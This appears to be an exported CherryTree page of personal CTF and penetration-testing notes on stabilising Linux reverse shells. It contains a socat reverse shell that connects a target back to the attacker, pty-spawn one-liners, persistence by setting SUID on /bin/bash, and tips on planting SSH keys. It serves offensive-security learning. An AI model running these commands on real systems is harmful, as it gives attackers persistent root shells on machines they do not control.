<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Stabilize Shell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Stabilize Shell</h1><br/><p><a name="stabilization required"></a><h1>Stabilization Required</h1><span style="color:#ffbe6f;"></span></p><p><span style="color:#ffbe6f;"></span><h2>To See Error Messages</h2></p><p>[CTF B 137-138]</p><p></p><p>Even if shell seems stable (e.g. you used <strong>rlwrap</strong>), you <span style="color:#ff0000;">may not see error messages</span> unless you perform additional steps to stabilize the shell. </p><p></p><p>Even after stabilizing (i.e. with Python), you <span style="color:#ff0000;">may not get the most specific error message</span> until you get an <span style="color:#ff0000;">SSH shell</span>.</p><p></p><p><h3>Example</h3></p><p>I was trying to use ruby Capability PrivEsc, but it failed to get a root shell &amp; didn&#39;t output any errors. The PrivEsc was being blocked by <a href="PrivEsc--Linux_29.html#Bypass AppArmor">AppArmor</a>.</p><p></p><p>After I used the Python Stabilization Technique &amp; re-trying PrivEsc, I got the error-</p><p></p><p><strong>‘setuid’: Operation not permitted (Errno::EPERM)</strong></p><p></p><p>After I connected via SSH, I was able to see the full error-</p><p></p><p><strong>‘exec’: Permission Denied /bin/bash (Errno::EACCESS)</strong></p><p></p><p><h2>To Run Program</h2></p><p>Certain actions (e.g running <strong>sudo</strong>) require stabilization. The <span style="color:#ff0000;">shell may even appear stabilized</span> (i.e it shows <strong>pwd</strong>, etc), but <span style="color:#ff0000;">try stabilizing if you see the following error</span>-</p><p></p><p><strong>no tty present and no askpass program specified</strong></p><p></p><p><h1>Stabilizing After PrivEsc</h1><h1></h1></p><p><h1></h1>Stabilizing (e.g with python) after getting root may spawn the stable shell in the context of the prev user, depending on method used for <a href="PrivEsc_8.html">PrivEsc</a>. You should get persistence before attempting to stabilize, if possible.</p><p>Now you can stabilize &amp; then use this SUID binary to regain root privs but with a stable shell.</p><p></p><p><em>chmod u+s /bin/bash</em></p><p><em>python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</em></p><p>/bin/bash -p</p><p><h1></h1></p><p><h1>SSH</h1><h1></h1></p><p><h1></h1>SSH terminals are usually very stable by def (even allowing CTRL+C w/o exiting), &amp; tend to have full color. See if you can turn R shell into SSH.</p><p></p><p>You may be able to create SSH keys on your target &amp; use them to sign in, if needed.<h1></h1></p><p><h1></h1><h1></h1></p><p><h1>Python</h1></p><p>Check if any version of python is installed, &amp; then stabilize like-</p><p></p><p><em>which python python2 python3</em></p><p><em>python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</em></p><p></p><p><h1>Socat</h1></p><p>upload static socat binary, make it executable, &amp; run</p><p></p><p><strong>{Attacker}</strong> <em>socat tcp-l:&lt;chosen-port&gt; file:`tty`,raw,echo=0</em></p><p></p><p><strong>{Target}</strong> <em>/tmp/socat tcp:&lt;your-ip&gt;:&lt;chosen-port&gt; exec:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</em></p><p></p><p><h1>Ruby</h1><h1></h1></p><p><h1></h1><em>which ruby</em><em></em></p><p><em>ruby -e &quot;exec &#39;/bin/bash&#39;&quot;</em><h1></h1></p><p><h1></h1><h1></h1></p><p><h1>Perl</h1></p><p><em>which perl</em><em></em></p><p><em>perl -e &quot;exec &#39;/bin/bash&#39;;&quot;</em></p><p></p><p><h1>Adding Color</h1></p><p>If shell doesn&#39;t already have color, may be able to set the TERM env var to a colored terminal.</p><p>However, won&#39;t always work &amp; sometimes it still won&#39;t have any color.</p><p></p><p><span style="color:#ff0000;">Sometimes a TERM is required for full stabilization</span>!</p><p></p><p><em>export TERM=xterm-256color</em></p><p></p><p><h1>Missing GID &amp; groups</h1></p><p>Depending on PrivEsc method, you may only impersonate the UID (username), but not anything else. Verify with <strong>id</strong>.</p><p></p><p>The perms from an Acct&#39;s GID &amp;/or group membership may be needed for PrivEsc. </p><p></p><p><h2>Using SSH</h2></p><p>Use the privs obtained via UID impersonation to setup SSH access, &amp; sign into the Acct via SSH using diff terminal.</p><p>This SSH session should have all of that user&#39;s privs &amp; it&#39;ll be fully stabilized.</p><p></p><p><h3>Requirements</h3></p><p>Need SSH Server to be running (<em>systemctl status ssh</em>) or the ability to start it. Also need proper config to allow SSH access for this user using the desired access method (e.g Private Key Auth).</p><p></p><p><h1>Enabling Control Characters</h1></p><p>Normal shells (excluding SSH, VNC, etc) can&#39;t properly handle signals like CTRL+C, resulting in YOUR terminal killing the Reverse Shell &amp; not the program running in the Reverse Shell.</p><p></p><p>The easiest solution is to use your shell to give yourself SSH access, but if that&#39;s not an option, you can try to <a href="https://zweilosec.github.io/posts/upgrade-linux-shell/">configure your shell</a> to support passing these signals through to the Reverse Shell.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: This is often annoyingly buggy &amp; unreliable.</p><p></p><p><h2>Enable Passthrough</h2></p><p>After stabilizing the shell, background that process with <strong>Ctrl</strong>+<strong>Z</strong>. Then configure your terminal to send raw input through to the Reverse Shell &amp; get the current size of your terminal window (don&#39;t resize it after this!)</p><p></p><p><h3>Using Zsh Terminal (Kali)</h3></p><p>Normal method won&#39;t work for terminals like Zsh (used by default on Kali) or Fish. The most reliable method is to switch to a bash shell before starting your listener.</p><p></p><p><span class="subheading">Potential Solutions</span></p><p><ol><li>Use <strong>rlwrap nc -lvnp</strong> when setting up your listener.</li></ol></p><p><ol><li>Ensure there&#39;s no space in your python pty command after the import (i.e. <strong>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;;</strong> ).</li></ol></p><p><ol><li>Type <strong>stty size;stty raw -echo;fg </strong>all on one line.</li></ol></p><p><ol><li>Finally, as a last resort, you could just switch to <strong>bash</strong> instead when setting up your <strong>nc</strong> listener.</li></ol></p><p></p><p></p><p><h3>Using Bash Terminal</h3></p><p><strong>{Attacker}</strong><em> stty raw -echo &amp;&amp; stty size &amp;&amp; fg</em></p><p></p><p>May need to hit Enter a few times to get prompt to show up. Replace<strong> $x</strong> &amp; <strong>$y </strong>with the terminal dimensions.</p><p></p><p><strong>{Target}</strong> <em>export SHELL=bash &amp;&amp;</em> <em>stty rows $x columns $y</em> <em>&amp;&amp; export TERM=xterm-256color</em></p><p></p><p><h3>Fixing Shell</h3></p><p>After this inevitably screws up your terminal, &amp; you&#39;ve killed your Reverse Shell, you can undo this by running <strong>reset</strong>.</p><p></p><p><span style="color:#f66151;text-decoration:underline;">WARNING</span>: This will clear your screen, so be sure you got everything you needed</p><p></p><p><h1>Tips</h1><ul><li>If you stabilize a shell by spawning a new one (e.g bash) &amp; lose the ability to see what you&#39;re typing, you may be able to fix this by using <em>exit</em> &amp; then re-stabilizing the shell. (Last resort is <em>reset</em>)</li></ul></p><p><ul><li>Certain programs / functionality require you to stabilize before they work (may even require you to “set a terminal type”, like <em>export TERM=xterm-256color</em>)</li></ul></p><p><ul><li>Terminal got messed up when using R shell, &amp; I assumed it was an issue with target. Actually had to use <em>reset</em> on Attacker machine after killing the shell.</li></ul></p><p><ul><li>Use a shell to execute another nc pipe Payload. If you exit out of the 2nd shell (<span style="color:#ff0000;">Using </span><strong><span style="color:#ff0000;">exit</span></strong> NOT CTRL+C), you&#39;ll regain control over the 1st shell.</li></ul></p></div>
</body>
</html>
